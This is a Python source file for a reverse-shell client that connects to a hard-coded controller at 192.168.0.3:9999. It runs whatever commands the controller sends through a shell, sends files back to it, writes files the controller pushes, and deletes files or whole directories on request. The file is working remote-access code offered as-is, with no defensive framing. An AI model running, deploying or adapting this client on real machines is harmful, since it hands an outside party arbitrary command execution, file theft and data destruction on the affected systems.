import socket
import os
import subprocess
import sys
import shutil
class Client:
    def __init__(self) -> None:
        self.conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # self.IP=socket.gethostbyname(socket.gethostname())
        self.IP="192.168.0.3"
        self.PORT=9999
        self.conn.connect((self.IP,self.PORT))
        print("You Got Connencted to Controller")
        self.showCommands=True
        self.conn.send(os.getcwd().encode()+">".encode())
        self.conn.send(socket.gethostname().encode())
    def start_client(self):
        cwd=os.getcwd()+">"
        print(cwd,end="")
        while True:
            try:
                cwd=os.getcwd()+">"
                command=self.conn.recv(1024).decode()
                if command:
                        print(command)
                
                if command=="ls":
                        command="dir"
                
                if command[:2]=="cd":
                    try:
                        os.chdir(os.path.join(os.getcwd(),command[3:]))
                        cwd=os.getcwd()+">"
                        print("\n"+cwd,end="")
                        self.conn.send("\n".encode()+cwd.encode())
                    except Exception as e:
                        self.conn.send("No such path exists")
                    continue
                
                if command=="cwd":
                        self.conn.send(os.getcwd().encode()+"\n".encode()+cwd.encode())
                        print(os.getcwd()+"\n"+cwd)
                        continue
                
                if command[:3]=="del":
                        if os.path.exists(os.path.join(os.getcwd(),command[4:])):
                            if os.path.isfile(os.path.join(os.getcwd(),command[4:])):
                                os.remove(os.path.join(os.getcwd(),command[4:]))
                                print("File removed Successfully")
                            else:
                                shutil.rmtree(os.path.join(os.getcwd(),command[4:]))
                                print("Directory removed Successfully")
                        print(cwd,end="")
                        continue
                
                if command[:3]=="get":
                    size=os.stat(os.path.join(os.getcwd(),command[4:])).st_size
                    self.conn.send(str(size).encode())
                    with open(command[4:],"rb") as f:
                        count=0
                        data=f.read(1024)
                        while data:
                            self.conn.send(data)
                            count+=1
                            print(f"{round(count*(1024/size)*100,2)}% Transferred",end="\r")
                            data=f.read(1024)
                    print("File Downloaded Successfully...")
                    print(os.getcwd()+">",end="")
                    continue
                if command[:4]=="send":
                    try:
                        size=int(self.conn.recv(1024).decode())
                        with open(command[5:],"wb") as f:
                            data=self.conn.recv(1024)
                            count=1
                            while data:
                                f.write(data)
                                print(f"{round(count*(1024/size)*100,2)}% Downloaded",end="\r")
                                if len(data)<1024: break
                                data=self.conn.recv(1024)
                                count+=1
                        print("File Downloaded Successfully...")
                        print(os.getcwd()+">",end="")
                    except:
                        print("File Doesnt Exist")
                    continue
                if command:
                    cmd=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
                    output_byte=cmd.stdout.read()+cmd.stderr.read()
                    output_str=output_byte.decode()
                    
                    self.conn.send(output_str.encode()+cwd.encode())
                    if self.showCommands:
                        print(output_str)
                        print(cwd,end="")
            except Exception as e:
                print(e)
                self.conn.close()
                sys.exit()
if __name__=='__main__':
    client=Client()
    client.start_client()